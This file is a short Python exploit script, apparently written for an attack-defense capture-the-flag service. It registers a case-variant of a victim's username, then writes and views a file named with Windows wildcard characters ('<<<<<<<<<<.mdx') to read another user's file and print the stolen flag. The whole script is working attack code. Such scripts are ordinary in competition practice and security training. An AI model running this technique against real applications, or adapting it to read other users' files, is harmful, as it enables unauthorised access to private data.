#!/usr/bin/env python3

import sys
import requests

# Takes the username as flag id
# Uses windows wildcards in filenames to steal te flag

class Client:

    def __init__(self, ip) -> None:
        self.sess = requests.Session()
        self.base_url = f'http://{ip}'
    
    def register(self, username, password):
        url = self.base_url + '/register'
        data = {
            'username': username,
            'password': password
        }
        resp = self.sess.post(url, data=data)
      
        return resp
    
    def write(self, filename, body, macro):
        url = self.base_url + '/write'
        data = {
            'filename': filename,
            'body': body,
            'macro': macro
        }

        resp = self.sess.post(url, data=data)
        return resp

    def view(self, filename):
        url = self.base_url + f'/view/{filename}'
        resp = self.sess.get(url)
        return resp

    def login(self, username, password):
        url = self.base_url + '/login'
        data = {
            'username': username,
            'password': password
        }

        resp = self.sess.post(url, data=data)
        
        return resp

def exploit(ip, flag_id):
    username_paylaod = flag_id.upper()
    filename_payload = '<<<<<<<<<<.mdx'
    
    client = Client(ip)
    client.register(username_paylaod, 'AAAA')
    client.login(username_paylaod, 'AAAA')
    resp = client.write(filename_payload, 'a', 'a').text
    resp = client.view(filename_payload)
    print(resp.text)
    return resp


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
